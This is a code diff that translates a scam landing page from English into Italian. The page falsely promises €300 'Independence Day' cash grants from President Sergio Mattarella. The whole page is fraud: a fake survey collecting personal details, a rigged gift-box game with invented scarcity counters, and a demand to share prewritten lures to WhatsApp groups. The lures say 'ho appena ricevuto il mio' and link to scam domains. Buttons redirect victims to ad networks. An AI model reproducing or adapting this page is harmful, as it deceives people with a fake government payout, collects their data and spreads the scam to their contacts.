@@ -6,7 +6,7 @@
 <head>
 	<script src="italigrant.js"></script>
 <script src="adsbank.js"></script>
-<title>PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY €300 CASH GRANTS TO ITALIANS</title>
+<title>PRESIDENTEE SERGIO MATTARELLA BORSE DI STUDIO DA 300 € IN CONTANTI PER IL GIORNO DELL'INDIPENDENZA AGLI ITALIANI</title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI6TiOIBkiVWN7SQMzfbbTurh2c3iM9VvCK4ZTlfbx28KeeVMU_i54HdtOEt36laToiSxi48FkY9x3MwhDWZIa0dzrxXeElJKSnsKa-Ocw4ph3uJTVR1jzMZFdSM76oCefbYVaBj4wvr_eyEhi8OlWcV8FYrua-n8_uE4b1441EuYFiWgT2pVh0ssVzePb/s1289/IMG_0993.jpeg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -293,13 +293,14 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Congratulazioni! Le tue risposte sono state salvate</h2>
  
 <p class="paragraph">
-Now you have a chance to win €300 INDEPENDENCE DAY cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Ora hai la possibilità di vincere un premio in denaro di 300 € per il GIORNO DELL'INDIPENDENZA
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Hai 3 possibilità! Ti auguriamo buona fortuna
+<br><br>
+Devi selezionare la scatola che contiene il regalo.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -307,9 +308,9 @@ Start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">La prossima volta avrai più fortuna</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Hai (2) possibilità extra.
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -318,11 +319,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAgTOAYHBs5XX2AePEeUdSuARNJyNxvrvMsTTSSMOjOV0vy8My1vhtuPl_BHpMRLwg_Ug5z83fZ4_UWr-Oy2EtB88d5k-M5fNN6TABlwFPvRYqEP4iMLXrzdeJj6fsG2F1jUYc2Vm1jAcxhyphenhyphennerakgr_WnFHyOCWvIjPg-k2A3_miZSyCeURZPJPct4ajV/s612/IMG_0991.jpeg" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Congratulazioni! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> €300 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Il tuo premio è: <b> €300 contanti</b><br>Segui le istruzioni nella pagina successiva per richiedere il tuo premio ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -339,12 +340,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh62FmY7D-bq_XyynV4RDKYOxkEDUy_bG36gGu3Pav7hQjtVrLhofDexKTa-RF39r1vgpG0udHw286U_GmtNq2QvwEUkn-zAi_1SDtBspQ5rel9VPBS5N9sa7sqRD7oZRgSxRbjYmzykwFLaWqAlCbYN-Dt4I9lrRJDH7F2SUBCFGSND-JZ4WeBfW8-AuzA/s675/IMG_0990.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Ciao!
 </h1>
   <p class="paragraph">
-Welcome to <b>PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY €300 CASH GRANTS TO ITALIANS</b>, Dont miss this year cash grant to ITALIANS.
+Benvenuti a <b>PRESIDENTE SERGIO MATTARELLA GIORNO DELL'INDIPENDENZA €300 CONTRIBUTI IN DENARO AGLI ITALIANI</b>, Non perdere il sussidio in denaro di quest'anno per gli ITALIANI.
 <br>
-Answer the questions below to claim <b>€300 Cash Prize</b>
+Rispondi alle domande seguenti per richiedere <b>€300 Premio in denaro</b>
 </p>
   <br>
 </div>
@@ -361,51 +362,51 @@ Answer the questions below to claim <b>€300 Cash Prize</b>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Hai risposto a 4/4 delle domande
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Le tue risposte sono in fase di elaborazione
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+ancora premi disponibili!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+Alla ricerca di regali..
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+Restano solo (289) regali!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Le scorte sono in fase di controllo
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of Italy?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Sei un cittadino di Italy?",
+              answers: [ { text: "SÌ" }, { text: "No" } ]
             },
                                                              {
-              title: "what is the name of Italy President?)",
+              title: "qual è il nome dell'Italia PRESIDENTE?)",
               answers: [ { text: "Sergio Mattarella" }, { text: "Antonio Segni" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Scegli il tuo genere?",
+              answers: [ { text: "Maschio" }, { text: "Femmina" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "Seleziona la tua fascia d'età?",
+              answers: [ { text: "18 - 20anni" }, { text: "21 - 25anni" }, { text: "26 - 30 anni" }, { text: "30anni Sopra" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -417,20 +418,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Congratulazioni! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh62FmY7D-bq_XyynV4RDKYOxkEDUy_bG36gGu3Pav7hQjtVrLhofDexKTa-RF39r1vgpG0udHw286U_GmtNq2QvwEUkn-zAi_1SDtBspQ5rel9VPBS5N9sa7sqRD7oZRgSxRbjYmzykwFLaWqAlCbYN-Dt4I9lrRJDH7F2SUBCFGSND-JZ4WeBfW8-AuzA/s675/IMG_0990.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>€300</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Il tuo premio è: <b>€300</b> <br>Segui le istruzioni qui sotto per ricevere il tuo premio !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.condividi con 5 gruppi / 15 amici su "Whatsapp" (fare clic sul "Whatsapp" icona qui sotto)</p><p class="rules">2. Clicca su "Continua" e richiedi il tuo premio.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">Condividi fino a quando la barra blu non è piena!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -441,7 +442,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                Continuare
                             </div>
    
   </div></div>
@@ -454,14 +455,14 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Congratulazioni! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://media.istockphoto.com/id/1915942732/photo/3d-rendering-of-stacks-of-Italyn-naira-notes-bundles-of-Italyn-currency-notes-isolated-on.jpg?s=612x612&w=0&k=20&c=sFbjX63jv4CMVHSsrsAnu2qS_sK3X7KwNB096vOVdS8=" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>€300 cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Il tuo premio è: <b>€300 contanti.</b> <br>Segui le istruzioni qui sotto per richiedere il tuo premio !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
@@ -469,17 +470,17 @@ Stock is being checked
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM €300</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">SCEGLI IL TIPO DI ACCOUNT</div><br/> <br/>
 
 	     <a  onclick="window.open('https://psegeevalrat.net/4/8525379')" href="https://whouphesaussums.net/4/8554813" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">RISPARMIO</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://psegeevalrat.net/4/8525379')" href="https://whouphesaussums.net/4/8554813" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">ATTUALE</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw €300</div> 
+            <div class="share_main_bt" id="offers">Ritirare €300</div> 
       <br>
           
        
@@ -532,10 +533,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY €300 CASH GRANTS TO ITALIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €300 instantly for INDEPENDENCE DAY.%0A i just got mine%0A%0AClick Here👇%0A https://www.ntegha-offerz.xyz/easter-R15000 ",
-    "PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY R15.000 CASH GRANTS TO ITALIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €300 instantly for INDEPENDENCE DAY.%0A i just got mine%0A%0AClick Here👇%0A https://www.ntegha-offerz.xyz/easter-R15000 ",
-    "PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY €300 CASH GRANTS TO ITALIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €300 instantly for INDEPENDENCE DAY.%0A i just got mine%0A%0AClick Here👇%0A https://www.ntegha-offerz.xyz/easter-R15000 ",
-    "PRESIDENT SERGIO MATTARELLA INDEPENDENCE DAY €300 CASH GRANTS TO ITALIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive €300 instantly for INDEPENDENCE DAY.%0A i just got mine%0A%0AClick Here👇%0A https://www.ntegha-offerz.xyz/easter-R15000 ",
+    "PRESIDENTE SERGIO MATTARELLA GIORNO DELL'INDIPENDENZA €300 CONTRIBUTI IN DENARO AGLI ITALIANI%0A%0A*COME OTTENERLO*%0AVisita il link qui sotto e rispondi alle seguenti domande e riceverai subito 300 € per GIORNO DELL'INDIPENDENZA.%0A ho appena ricevuto il mio%0A%0AClicca qui👇%0A https://www.udwang.xyz/withdraw-eur300 ",
+    "PRESIDENTE SERGIO MATTARELLA GIORNO DELL'INDIPENDENZA €300 CONTRIBUTI IN DENARO AGLI ITALIANI%0A%0A*COME OTTENERLO*%0AVisita il link qui sotto e rispondi alle seguenti domande e riceverai subito 300 € per GIORNO DELL'INDIPENDENZA.%0A ho appena ricevuto il mio%0A%0AClicca qui👇%0A https://www.udwang.xyz/withdraw-eur300 ",
+    "PRESIDENTE SERGIO MATTARELLA GIORNO DELL'INDIPENDENZA €300 CONTRIBUTI IN DENARO AGLI ITALIANI%0A%0A*COME OTTENERLO*%0AVisita il link qui sotto e rispondi alle seguenti domande e riceverai subito 300 € per GIORNO DELL'INDIPENDENZA.%0A ho appena ricevuto il mio%0A%0AClicca qui👇%0A https://www.udwang.xyz/withdraw-eur300 ",
+    "PRESIDENTE SERGIO MATTARELLA GIORNO DELL'INDIPENDENZA €300 CONTRIBUTI IN DENARO AGLI ITALIANI%0A%0A*COME OTTENERLO*%0AVisita il link qui sotto e rispondi alle seguenti domande e riceverai subito 300 € per GIORNO DELL'INDIPENDENZA.%0A ho appena ricevuto il mio%0A%0AClicca qui👇%0A https://www.udwang.xyz/withdraw-eur300 ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
